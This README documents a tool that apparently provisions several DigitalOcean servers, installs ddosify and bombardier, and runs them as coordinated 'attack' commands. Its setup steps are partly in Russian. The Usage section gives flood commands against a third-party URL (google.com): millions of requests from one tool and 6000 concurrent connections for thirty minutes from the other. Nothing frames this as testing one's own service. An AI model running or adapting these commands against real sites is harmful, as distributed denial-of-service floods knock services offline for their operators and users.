### Installation

1. Install git

2. Install Node.js

3. Download code from GitHub

4.
```` 
  npm install
````

5. Create an empty file with name `.env` in the root folder.

6. Register at DigitalOcean, create a droblet manually:

Create-Droplets
* Ubuntu
* Basic
* 12$/month
* Authentication - SSH key

Как создать новый SSH key: 
  * (PS в появившимся окне справа инструкция. если кратко - то запустить консоль cmd и команду ssh-keygen)
  * из сформированного файла .pub скопировать содерждимое в поле SSH key content
  * указать имя, например f1

Для того чтобы SSH_ID впилить в солюшин - нужно в браузере нажать правой кнопке на подключенном SSH digitalocean и из лейбла взять часть которая состоит из цифр
(Например <label for="sshKey_33402836">d3</label>, SSH_ID = 33402836)

7. Visit https://cloud.digitalocean.com/account/api/tokens, generate token.

8. Create file with the name `.env` in the root folder of the project.

````
DO_API_KEY=<INSERT DIGITAL OCEAN API KEY>
DO_API_SSH_KEY_ID=<INSERT DIGITAL OCEAN SSH KEY ID>
````

You're done.

9. create `servers.js` (if you have any servers)

````
const SERVERS = [
  /*
  EXAMPLE
  {
    connection: {
      host: "1.1.1.1",
      username: "root",
      privateKey: `${process.env.HOME}/.ssh/id_rsa`,
    },
  },
  */
];

export default SERVERS;

````

### Usage


````
npm run create -- -c 2
````
Creates 2 new droplets in Digital Ocean, installs ddosify. See `constants.js`. Edit `constants.js` to change `CPU` & `REGION`.

````
npm run attack -- "ddosify -t 'https://google.com' -n $((10000 * 333)) -d 10000 -T 999 -m GET"
````

````
npm run attack -- "bombardier -c 6000 -d 1800s -m POST -H 'Content-Type: application/x-www-form-urlencoded' -l https://google.com"
````

````
npm run cleanup
````

Destroys all droplets. Do this before going to sleep. Save money.


# Known issues

- `npm run attack` will fail if the `npm run create` is in progress.

- Error:
````
FATAL: 1.1.1.1
Error: Timed out while waiting for handshake
````
Quick solution: destroy server with this IP on Digital Ocean.


# Known goodies

- It's okay to create 8 virtual servers on Digital Ocean.
- Will create a script to automatically destroy all servers. To save money.


## Part 2

1. create file `servers.js`

````javascript
"use strict";
const getDefaultKeyStoragePath = () => {
  return `${process.env.HOME}/.ssh/id_rsa`;
};

const SERVERS = [
  /*
  EXAMPLE
  {
    connection: {
      host: "1.1.1.1",
      username: "root",
      privateKey: `${process.env.HOME}/.ssh/id_rsa`,
    },
  },
  */
];

export default SERVERS;

````